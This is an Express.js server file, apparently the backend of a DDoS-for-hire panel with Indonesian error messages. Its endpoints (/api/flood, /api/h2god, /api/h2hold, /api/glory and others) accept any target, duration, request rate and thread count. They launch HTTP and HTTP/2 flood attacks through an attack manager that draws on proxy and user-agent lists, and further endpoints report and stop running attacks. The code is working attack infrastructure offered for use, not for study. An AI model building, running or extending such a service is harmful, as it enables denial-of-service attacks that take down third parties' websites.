const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, '../public')));

// Import AttackManager
const AttackManager = require('../lib/attackManager');
const attackManager = new AttackManager();

// Rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 10,
  message: { success: false, error: 'Too many requests, please try again later' }
});

// Home page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// API Routes
app.get('/api/flood', limiter, async (req, res) => {
  const { target, duration } = req.query;
  
  if (!target || !duration) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target dan duration diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    await attackManager.executeAttack('flood', attackId, [target, duration], parseInt(duration) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'flood',
      target: target,
      duration: duration,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'flood'
    });
  }
});

app.get('/api/flood1', limiter, async (req, res) => {
  const { target, duration } = req.query;
  
  if (!target || !duration) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target dan duration diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    await attackManager.executeAttack('flood1', attackId, [target, duration], parseInt(duration) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'flood1',
      target: target,
      duration: duration,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'flood1'
    });
  }
});

app.get('/api/h2god', limiter, async (req, res) => {
  const { target, time, rate, threads } = req.query;
  
  if (!target || !time || !rate || !threads) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target, time, rate, dan threads diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    await attackManager.executeAttack('h2god', attackId, params, parseInt(time) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'h2god',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'h2god'
    });
  }
});

app.get('/api/h2hold', limiter, async (req, res) => {
  const { target, time, rate, threads } = req.query;
  
  if (!target || !time || !rate || !threads) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target, time, rate, dan threads diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    await attackManager.executeAttack('h2-hold', attackId, params, parseInt(time) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'h2hold',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'h2hold'
    });
  }
});

app.get('/api/glory', limiter, async (req, res) => {
  const { target, time, rate, threads } = req.query;
  
  if (!target || !time || !rate || !threads) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target, time, rate, dan threads diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    const params = [target, time, rate, threads];
    await attackManager.executeAttack('glory', attackId, params, parseInt(time) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'glory',
      target: target,
      time: time,
      rate: rate,
      threads: threads,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'glory'
    });
  }
});

app.get('/api/methods', (req, res) => {
  const methods = [
    {
      name: 'flood',
      description: 'Metode Flood dasar',
      parameters: ['target', 'duration'],
      endpoint: '/api/flood'
    },
    {
      name: 'flood1',
      description: 'Metode Flood tingkat tinggi',
      parameters: ['target', 'duration'],
      endpoint: '/api/flood1'
    },
    {
      name: 'h2god',
      description: 'Metode HTTP/2 God',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/h2god'
    },
    {
      name: 'h2hold',
      description: 'Metode HTTP/2 Hold',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/h2hold'
    },
    {
      name: 'glory',
      description: 'Metode Glory',
      parameters: ['target', 'time', 'rate', 'threads'],
      endpoint: '/api/glory'
    }
  ];
  
  res.json({
    success: true,
    methods: methods,
    stats: {
      activeAttacks: attackManager.getActiveCount(),
      maxConcurrent: attackManager.maxConcurrent
    }
  });
});

app.get('/api/status', (req, res) => {
  const scriptNames = ['flood', 'flood1', 'h2god', 'h2-hold', 'glory'];
  const scriptData = scriptNames.map(name => {
    const exists = fs.existsSync(path.join(__dirname, '../lib/scripts', `${name}.js`));
    return { name, exists };
  });
  
  const proxyExists = fs.existsSync(path.join(__dirname, '../assets/proxy.txt'));
  const uaExists = fs.existsSync(path.join(__dirname, '../assets/ua.txt'));
  
  res.json({
    success: true,
    server: {
      status: 'running',
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      activeAttacks: attackManager.getActiveCount(),
      maxConcurrent: attackManager.maxConcurrent
    },
    files: {
      scripts: scriptData,
      proxy: { exists: proxyExists, path: proxyExists ? '/assets/proxy.txt' : null },
      userAgents: { exists: uaExists, path: uaExists ? '/assets/ua.txt' : null }
    }
  });
});

app.get('/api/stats', (req, res) => {
  res.json({
    success: true,
    stats: {
      activeAttacks: attackManager.getActiveCount(),
      maxConcurrent: attackManager.maxConcurrent,
      available: attackManager.canStartAttack(),
      memory: process.memoryUsage(),
      uptime: process.uptime()
    }
  });
});

app.post('/api/stop', (req, res) => {
  const { attackId } = req.body;
  
  if (!attackId) {
    return res.status(400).json({
      success: false,
      error: 'attackId diperlukan'
    });
  }
  
  const stopped = attackManager.removeAttack(attackId);
  
  res.json({
    success: stopped,
    message: stopped ? `Attack ${attackId} stopped` : `Attack ${attackId} not found`
  });
});

// Serve assets
app.get('/assets/:file', (req, res) => {
  const filePath = path.join(__dirname, '../assets', req.params.file);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).json({ success: false, error: 'File not found' });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error('Server Error:', err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal Server Error',
    message: err.message
  });
});

// Handle 404
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint tidak ditemukan'
  });
});

module.exports = app;